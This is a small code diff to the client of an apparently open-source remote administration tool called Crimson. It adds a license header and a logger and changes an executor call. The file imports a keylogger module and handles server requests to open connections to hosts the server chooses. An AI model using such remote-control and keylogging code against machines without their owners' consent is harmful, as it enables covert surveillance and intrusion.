@@ -1,3 +1,20 @@
+/******************************************************************************
+ *                                                                            *
+ *                    Copyright 2017 Subterranean Security                    *
+ *                                                                            *
+ *  Licensed under the Apache License, Version 2.0 (the "License");           *
+ *  you may not use this file except in compliance with the License.          *
+ *  You may obtain a copy of the License at                                   *
+ *                                                                            *
+ *      http://www.apache.org/licenses/LICENSE-2.0                            *
+ *                                                                            *
+ *  Unless required by applicable law or agreed to in writing, software       *
+ *  distributed under the License is distributed on an "AS IS" BASIS,         *
+ *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
+ *  See the License for the specific language governing permissions and       *
+ *  limitations under the License.                                            *
+ *                                                                            *
+ *****************************************************************************/
 package com.subterranean_security.crimson.client.exe;
 
 import java.awt.HeadlessException;
@@ -9,6 +26,8 @@ import java.net.ConnectException;
 import javax.imageio.ImageIO;
 
 import org.jnativehook.NativeHookException;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
 
 import com.google.protobuf.ByteString;
 import com.subterranean_security.crimson.client.modules.Keylogger;
@@ -18,6 +37,7 @@ import com.subterranean_security.crimson.client.store.ConfigStore;
 import com.subterranean_security.crimson.core.misc.HCP;
 import com.subterranean_security.crimson.core.net.Connector;
 import com.subterranean_security.crimson.core.net.Connector.Config;
+import com.subterranean_security.crimson.core.net.executor.BasicExecutor;
 import com.subterranean_security.crimson.core.net.executor.temp.ExeI;
 import com.subterranean_security.crimson.core.net.executor.temp.Exelet;
 import com.subterranean_security.crimson.core.store.LcvidStore;
@@ -42,13 +62,15 @@ import com.subterranean_security.crimson.sc.Logsystem;
 
 public class MiscExe extends Exelet implements ExeI {
 
+	private static final Logger log = LoggerFactory.getLogger(MiscExe.class);
+
 	public MiscExe(Connector connector) {
 		super(connector);
 	}
 
 	public void rq_direct_connection(Message m) {
 		RQ_MakeDirectConnection rq = m.getRqMakeDirectConnection();
-		Connector connector = new Connector(getInstanceExecutor());
+		Connector connector = new Connector(BasicExecutor.getInstanceExecutor());
 		try {
 			connector.connect(Config.ConnectionType.DATAGRAM, rq.getHost(), rq.getPort());
 		} catch (ConnectException e) {
